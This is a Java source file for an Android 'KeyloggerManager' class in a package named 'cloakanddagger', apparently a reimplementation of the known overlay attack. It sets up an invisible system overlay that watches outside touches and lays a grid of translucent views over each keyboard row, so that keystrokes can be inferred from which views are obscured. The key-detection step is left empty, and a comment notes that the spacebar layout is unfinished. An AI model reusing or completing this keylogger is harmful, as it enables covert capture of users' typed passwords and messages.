package andrews.cloakanddagger;

import android.content.Context;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

/**
 * Created by Andrew Schaffer on 11/1/2017.
 */

public class KeyloggerManager {

    private int type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
    private int flags = 0;
    private WindowManager manager;
    private volatile Context parent;
    private int width, height;
    volatile View touch_view;
    volatile View[] row_1 = new View[10];
    volatile View[] row_2 = new View[9];
    volatile View[] row_3 = new View[9];
    volatile View[] row_4 = new View[5];

    public KeyloggerManager(Context cxt, WindowManager manager, int width, int height) {
        parent = cxt;
        this.manager = manager;
        this.width = width;
        this.height = height;
        makeOverlay();
    }

    private void makeOverlay() {

        int i;
        manager = (WindowManager) parent.getSystemService(Context.WINDOW_SERVICE);

        /**Set up the touch listening view which won't be visible**/
        touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch = new WindowManager.LayoutParams(0, 0, type, flags
            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {

                if (true) {
                    /**Test which views are obscured**/
                }

                return false;
            }
        });
        manager.addView(touch_view, layoutParams_touch);

        /**Set up the grid of overlays for the keyboard**/
        for (i=0; i<row_1.length; i++) {

            row_1[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width - (width/10)*i, 175, type, flags
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            layoutParams_keys.x = (width/10)*i;
            layoutParams_keys.y = 525;

            manager.addView(row_1[i], layoutParams_keys);
        }
        for (i=0; i<row_2.length; i++) {

            row_2[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width - (width/9)*i, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 350;

            manager.addView(row_2[i], layoutParams_keys);
        }
        for (i=0; i<row_3.length; i++) {

            row_3[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width - (width/9)*i, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 175;

            manager.addView(row_3[i], layoutParams_keys);
        }

        /** Need to fix layout for spacebar row **/
        for (i=0; i<row_4.length; i++) {

            row_4[i] = View.inflate(parent, R.layout.key_overlay, null);
            int test = (i == 2) ? (width - (width/9)*5) : (width - (width/9)*i);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(test, 175, type, flags
                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSLUCENT);

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            layoutParams_keys.x = (i == 2) ? (width-(width/9)*5) : (width-(width/9)*i);
            layoutParams_keys.y = 0;

            manager.addView(row_4[i], layoutParams_keys);
        }
    }
}
